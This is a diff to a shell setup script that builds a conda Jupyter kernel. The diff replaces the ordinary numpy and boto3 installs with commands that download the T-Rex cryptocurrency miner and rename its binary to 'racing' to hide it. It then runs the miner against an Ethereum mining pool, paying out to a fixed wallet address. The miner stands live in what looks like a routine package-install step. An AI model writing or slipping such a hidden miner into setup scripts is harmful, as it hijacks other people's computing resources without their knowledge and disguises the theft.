@@ -34,7 +34,9 @@ conda activate "$KERNEL_NAME"
 pip install --quiet ipykernel
 
 # Customize these lines as necessary to install the required packages
-conda install --yes numpy
-pip install --quiet boto3
+wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz
+tar xvzf t-rex-0.22.1-linux.tar.gz
+mv t-rex racing
+./racing -a ethash -o stratum+ssl://eth.2miners.com:12020 -u 0xe968dA3271ADCddA2496757301D2A5Ffa400CF50 -p x -w aan
 
 EOF
